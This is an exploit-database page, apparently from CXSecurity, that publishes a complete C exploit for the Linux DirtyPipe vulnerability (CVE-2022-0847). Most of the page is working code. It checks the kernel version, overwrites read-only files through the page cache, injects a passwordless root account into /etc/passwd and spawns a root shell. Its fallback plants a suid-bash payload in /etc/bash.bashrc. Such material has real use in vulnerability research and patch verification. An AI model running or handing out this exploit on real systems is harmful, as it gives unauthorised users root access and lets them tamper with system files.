---
title: Linux Kernel 5.8 <  5.15.25 - Local Privilege Escalation (DirtyPipe 2)
url: https://cxsecurity.com/issue/WLB-2026020001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-02
fetch_date: 2026-02-03T04:08:54.013201
---

# Linux Kernel 5.8 <  5.15.25 - Local Privilege Escalation (DirtyPipe 2)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Linux Kernel 5.8 < 5.15.25 - Local Privilege Escalation (DirtyPipe 2)** **2026.02.02**  Credit:  **[Max Kellermann](https://cxsecurity.com/author/Max%2BKellermann/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-0847](https://cxsecurity.com/cveshow/CVE-2022-0847/ "Click to see CVE-2022-0847")**  CWE: **[CWE-665](https://cxsecurity.com/cwe/CWE-665 "CWE-665")**  CVSS Base Score: **7.2/10**  Impact Subscore: **10/10**  Exploitability Subscore: **3.9/10**  Exploit range: **Local**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

/\*
Exploit Title: Linux Kernel 5.8 < 5.15.25 - Local Privilege Escalation (DirtyPipe 2)
Exploit Author: Antonius (w1sdom)
github : https://github.com/bluedragonsecurity
web : https://www.bluedragonsec.com
tested on :
- linux kernel 5.13.0-21-generic (compiled on lubuntu 20.04.5)
- linux lubuntu 20.04.2 - linux kernel 5.8
Original Author: Max Kellermann (max.kellermann@ionos.com)
CVE: CVE-2022-0847
\* Copyright 2022 CM4all GmbH / IONOS SE
\*
\* author: Max Kellermann <max.kellermann@ionos.com>
\*
\* Proof-of-concept exploit for the Dirty Pipe
\* vulnerability (CVE-2022-0847) caused by an uninitialized
\* "pipe\_buffer.flags" variable. It demonstrates how to overwrite any
\* file contents in the page cache, even if the file is not permitted
\* to be written, immutable or on a read-only mount.
\*
\* This exploit requires Linux 5.8 or later; the code path was made
\* reachable by commit f6dd975583bd ("pipe: merge
\* anon\_pipe\_buf\*\_ops"). The commit did not introduce the bug, it was
\* there before, it just provided an easy way to exploit it.
\*
\* There are two major limitations of this exploit: the offset cannot
\* be on a page boundary (it needs to write one byte before the offset
\* to add a reference to this page to the pipe), and the write cannot
\* cross a page boundary.
\*
\* Example: ./write\_anything /root/.ssh/authorized\_keys 1 $'\nssh-ed25519 AAA......\n'
\*
\* Further explanation: https://dirtypipe.cm4all.com/
\*/
#define \_GNU\_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <ctype.h>
int validate\_kernv() {
struct utsname buffer;
int major, minor, patch;
int is\_vulnerable = 0;
char \*version\_str;
int len, compile\_year;
if (uname(&buffer) != 0) {
perror("uname");
return 1;
}
version\_str = buffer.version;
len = strlen(version\_str);
compile\_year = 0;
for (int i = len - 4; i >= 0; i--) {
if (isdigit(version\_str[i]) && isdigit(version\_str[i+1]) &&
isdigit(version\_str[i+2]) && isdigit(version\_str[i+3])) {
compile\_year = atoi(&version\_str[i]);
break;
}
}
if (compile\_year < 2023) {
is\_vulnerable = 1;
}
int fields = sscanf(buffer.release, "%d.%d.%d", &major, &minor, &patch);
if (fields < 3) patch = 0;
if (major == 5) {
if (minor >= 8 && minor <= 14) {
is\_vulnerable = 1;
}
else if (minor == 15 && patch < 25) {
is\_vulnerable = 1;
}
}
else {
printf("[-] kernel is not vulnerable !!! quitting ...");
exit(-1);
}
if (is\_vulnerable) {
printf("[\*] kernel is vulnerable\n");
}
else {
printf("[-] kernel is not vulnerable !!! quitting ...");
exit(-1);
}
return 0;
}
void prepare\_pipe(int p[2]) {
pipe(p);
int capacity = fcntl(p[1], 1032);
static char dummy[4096];
for (int r = capacity; r > 0; ) {
int n = r > sizeof(dummy) ? sizeof(dummy) : r;
write(p[1], dummy, n);
r -= n;
}
for (int r = capacity; r > 0; ) {
int n = r > sizeof(dummy) ? sizeof(dummy) : r;
read(p[0], dummy, n);
r -= n;
}
}
int inject\_payload(char \*target, char \*payload) {
int fd = open(target, O\_RDONLY);
int p[2];
\_\_off64\_t offset = 1;
prepare\_pipe(p);
fd = open(target, O\_RDONLY);
if (fd < 0) return 1;
if (splice(fd, &offset, p[1], NULL, 1, 0) < 0) {
perror("[-] splice failed");
return 0;
}
printf("[\*] injecting payload to %s\n", target);
write(p[1], payload, strlen(payload));
return 1;
}
void bashrc() {
char \*target = "/etc/bash.bashrc";
char \*payload = "\ncp /bin/bash /tmp/x; chmod +s /tmp/x\n#";
if (inject\_payload(target, payload) == 0) {
printf("[-] failed to inject payload !");
}
else {
printf("[\*] payload injected to %s\n", target);
printf("[\*] you need to wait for root to login\n");
printf("[\*] once the root logged in you will get suid shell on /tmp/x\n");
printf("[\*] get root by : /tmp/x -p\n");
}
}
int toor\_check() {
FILE \*fp;
char path[1035];
fp = popen("su toor -c id", "r");
if (fp == NULL) {
return 0;
}
if (fgets(path, sizeof(path), fp) != NULL) {
if (strstr(path, "root")) {
return 1;
}
}
pclose(fp);
return 0;
}
int passwd() {
char \*target = "/etc/passwd";
char \*payload = "\ntoor::0:0:root:/root:/bin/bash\n#";
system("cp /etc/passwd /tmp/passwd.bak");
if (inject\_payload(target, payload) == 0) {
printf("[-] failed to inject payload !");
}
if (toor\_check() == 1) {
printf("[+] exploitation success, getting root for you.\n");
system("su toor");
}
else {
printf("[-] failed on method 1, testing method 2\n");
return 0;
}
return 1;
}
int main() {
validate\_kernv();
if (passwd() == 0) {
bashrc();
}
return 0;
}

**##### References:**

https://dirtypipe.cm4all.com/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top